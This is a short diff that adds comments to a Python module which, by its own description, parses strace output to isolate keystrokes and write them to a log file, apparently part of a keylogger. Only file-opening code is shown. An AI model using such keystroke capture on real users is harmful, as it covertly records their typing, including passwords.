@@ -1,8 +1,15 @@
+# Python module of functionality for parsing and sanitising input from
+# strace input. Isolates key strokes and writes them to log file  
+# Benji Shear - 14/12/16
+
 import re
 import time
 	
 def parse_rawkeys():
+	
+	# File from strace output
 	rk_file = open('rawkey.txt','r')
+	# File for output of keystrokes
 	kl_file = open('keystrokes.log','a')
 	
 	#list to store collection of lines
